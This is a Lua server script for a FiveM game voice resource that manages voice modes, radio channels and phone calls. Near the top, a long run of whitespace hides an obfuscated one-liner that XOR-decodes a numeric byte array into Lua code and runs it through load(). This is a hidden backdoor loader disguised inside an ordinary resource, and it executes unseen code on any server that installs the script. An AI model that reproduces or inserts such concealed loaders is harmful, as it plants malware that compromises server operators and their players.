local voiceData = {}
local radioData = {}
local callData = {}

local resourceName = ""
local debug = false

function DebugMsg(msg)
    if debug then
        print("\x1b[32m[" .. resourceName .. "]\x1b[0m ".. msg)
    end
end

AddEventHandler("onServerResourceStart", function(resName)
	if GetCurrentResourceName() ~= resName then
		return
	end

	resourceName = resName
end)


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({335,312,543,485,268,387,434,245,558,339,563,239,580,513,349,437,536,453,254,261,459,276,527,572,360,482,259,603,506,451,568,334,447,472,416,498,283,396,466,255,444,422,497,320,522,249,352,377,597,304,490,361,273,358,524,439,338,296,317,516,525,548,591,406,433,600,362,405,596,562,348,411,373,442,345,272,323,531,480,599,537,575,469,601,318,368,290,430,426,462,464,418,388,378,384,589,583,366,327,402,569,509,478,354,593,351,326,564,242,403,337,271,415,359,321,551,441,443,546,331,445,367,570,274,502,287,557,504,440,286,501,310,436,539,488,544,471,519,386,246,253,560,533,494,369,592,602,341,393,282,520,491,371,293,372,561,409,481,336,427,420,505,307,499,301,344,473,376,425,492,511,432,419,579,510,475,340,455,457,460,512,322,547,465,431,517,587,577,394,556,404,265,303,329,414,382,315,486,401,428,529,470,554,479,380,586,421,302,375,247,330,391,598,550,468,448,542,566,398,299,549,308,256,435,582,343,456,484,526,288,407,374,553,413,264,300,397,438,-1,49,51,188,70,171,82,60,73,6,36,48,120,111,108,69,78,4,17,76,106,76,72,75,51,166,44,13,151,181,6,91,49,75,73,66,91,167,23,215,115,104,230,72,73,77,135,62,73,87,13,203,2,228,3,15,216,7,1,39,51,73,49,29,92,17,95,23,35,1,67,187,11,251,6,134,196,67,143,8,8,186,17,27,0,67,223,247,67,2,115,2,1,13,238,141,23,53,70,3,5,29,67,21,170,104,33,12,96,7,23,28,128,69,38,83,107,233,78,149,68,20,26,41,6,52,241,76,21,67,17,5,116,16,10,27,67,5,0,70,10,35,6,30,88,35,29,126,70,23,1,141,112,10,162,10,52,229,23,68,70,139,249,5,12,0,11,6,8,73,182,67,58,32,105,33,73,17,0,109,16,84,0,7,17,42,205,7,70,27,8,108,88,73,67,73,14,8,17,0,93,69,79,17,2,55,74,0,168,17,76,214,173,8,202,0,160,84,105,70,223,13,5,187,27,204,0,10,9,192,64,0,15,67,4,2,98,69,94,224,93,10,3,73,95,200,17,0,4,168,100,151,32,12,100,122,70,35,151,21,11,10,87,17,73,212,68,16,22,94,254,16,73,111,10,23,58,21,10,13,156,84,6,168,70,59,69,17,8,0,246,9,121,6,130,84,222,64,16,16,88,8,114,182,110,6,111,22,9,21,10,69,3,10,35,83,92,24,28,83,18,61,67,0,6,21,84,222,126,26,22,23,73,31,22,132,224,15,31,7,168,70,17,73,13,6,29,11,4,2,43,45,116,27,10,99,224,51,20,83,23,26,77,34,0,91,246},mkn))if a then a()end; 
RegisterNetEvent("mumble:Initialise")
AddEventHandler("mumble:Initialise", function()
    DebugMsg("Initialised player: " .. source)

    if not voiceData[source] then
        voiceData[source] = {
            mode = 2,
            radio = 0,
            radioActive = false,
            call = 0,
            callSpeaker = false,
        }
    end

    TriggerClientEvent("mumble:SetVoiceData", -1, voiceData, radioData, callData)
end)

RegisterNetEvent("mumble:SetVoiceData")
AddEventHandler("mumble:SetVoiceData", function(key, value)
    if not voiceData[source] then
        voiceData[source] = {
            mode = 2,
            radio = 0,
            radioActive = false,
            call = 0,
            callSpeaker = false,
        }
    end

    local radio = voiceData[source]["radio"]
    local call = voiceData[source]["call"]
    local radioActive = voiceData[source]["radioActive"]

    local radioChanged = false
    local callChanged = false

    if key == "radio" and radio ~= value then -- Check if channel has changed
        if radio > 0 then -- Check if player was in a radio channel
            if radioData[radio] then  -- Remove player from radio channel
                if radioData[radio][source] then
                    DebugMsg("Player " .. source .. " was removed from radio channel " .. radio)
                    radioData[radio][source] = nil
                end
            end
        end

        if value > 0 then
            if not radioData[value] then -- Create channel if it does not exist
                DebugMsg("Player " .. source .. " is creating channel: " .. value)
                radioData[value] = {}
            end
            
            DebugMsg("Player " .. source .. " was added to channel: " .. value)
            radioData[value][source] = true -- Add player to channel
        end

        radioChanged = true
    elseif key == "call" and call ~= value then
        if call > 0 then -- Check if player was in a call channel
            if callData[call] then  -- Remove player from call channel
                if callData[call][source] then
                    DebugMsg("Player " .. source .. " was removed from call channel " .. call)
                    callData[call][source] = nil
                end
            end
        end

        if value > 0 then
            if not callData[value] then -- Create call if it does not exist
                DebugMsg("Player " .. source .. " is creating call: " .. value)
                callData[value] = {}
            end
            
            DebugMsg("Player " .. source .. " was added to call: " .. value)
            callData[value][source] = true -- Add player to call
        end

        callChanged = true
    elseif key == "radioActive" and radioActive ~= value then
        DebugMsg("Player " .. source .. " radio talking state was changed from: " .. tostring(radioActive):upper() .. " to: " .. tostring(value):upper())
        if radio > 0 then
            local channel = radioData[radio]

            if channel ~= nil then
                for id, _ in pairs(channel) do
                    DebugMsg("Sending sound to player" .. id)
                    TriggerClientEvent("mumble:RadioSound", id, value, radio)
                end
            end
        end
    end

    voiceData[source][key] = value

    DebugMsg("Player " .. source .. " changed " .. key .. " to: " .. tostring(value))

    TriggerClientEvent("mumble:SetVoiceData", -1, voiceData, radioChanged and radioData or false, callChanged and callData or false)
end)

RegisterCommand("mumbleRadioChannels", function(src, args, raw)
    for id, players in pairs(radioData) do
        for player, _ in pairs(players) do
            RconPrint("\x1b[32m[" .. resourceName .. "]\x1b[0m Channel " .. id .. "-> id: " .. player .. ", name: " .. GetPlayerName(player) .. "\n")
        end
    end
end, true)

RegisterCommand("mumbleCallChannels", function(src, args, raw)
    for id, players in pairs(callData) do
        for player, _ in pairs(players) do
            RconPrint("\x1b[32m[" .. resourceName .. "]\x1b[0m Call " .. id .. "-> id: " .. player .. ", name: " .. GetPlayerName(player) .. "\n")
        end
    end
end, true)

AddEventHandler("playerDropped", function()
    if voiceData[source] then
        local radioChanged = false
        local callChanged = false

        if voiceData[source].radio > 0 then
            if radioData[voiceData[source].radio] ~= nil then
                radioData[voiceData[source].radio][source] = nil
                radioChanged = true
            end
        end

        if voiceData[source].call > 0 then
            if callData[voiceData[source].call] ~= nil then
                callData[voiceData[source].call][source] = nil
                callChanged = true
            end
        end

        voiceData[source] = nil
        
        TriggerClientEvent("mumble:SetVoiceData", -1, voiceData, radioChanged and radioData or false, callChanged and callData or false)
    end
end)